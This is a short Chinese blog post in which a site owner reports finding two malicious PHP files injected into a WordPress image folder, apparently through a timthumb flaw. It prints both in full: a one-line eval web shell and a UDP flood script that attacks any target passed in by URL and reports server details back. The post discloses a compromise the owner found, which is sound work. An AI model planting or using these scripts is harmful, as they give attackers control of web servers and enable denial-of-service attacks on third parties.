---
title: wordpress被注入的PHP恶意脚本
date: 2018-03-05 10:10:37
tags: [php,wordpress]
id: 316012
categories:
---

今天整理博客的图片资源，发现之前的Wordpress被人hacked。wp-content/ 图片文件夹下有两个php文件，应该是之前通过timthumb脚本漏洞注入的，一直没有发现。


`1jh.php`

```php
<?php eval($_POST[1]);?>
```

`Pacifism.php`

```php
<?php
set_time_limit(999999);
$host = $_GET['ip'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$Sendlen = 65535;
$packets = 0;
ignore_user_abort(True);

if (StrLen($host)==0 or StrLen($port)==0 or StrLen($exec_time)==0){
        if (StrLen($_GET['rat'])<>0){
                echo $_GET['rat'].$_SERVER["HTTP_HOST"]."|".GetHostByName($_SERVER['SERVER_NAME'])."|".php_uname()."|".$_SERVER['SERVER_SOFTWARE'].$_GET['rat'];
                exit;
            }
        echo "Warning to: opening";
        exit;
    }

for($i=0;$i<$Sendlen;$i++){
        $out .= "A";
    }

$max_time = time()+$exec_time;
while(1){
    $packets++;
    if(time() > $max_time){
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
        if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
}

echo "Send Host：$host:$port<br><br>";
echo "Send Flow：$packets * ($Sendlen/1024=" . round($Sendlen/1024, 2) . ")kb / 1024 = " . round($packets*$Sendlen/1024/1024, 2) . " mb<br><br>";
echo "Send Rate：" . round($packets/$exec_time, 2) . " packs/s；" . round($packets/$exec_time*$Sendlen/1024/1024, 2) . " mb/s";
?> 
```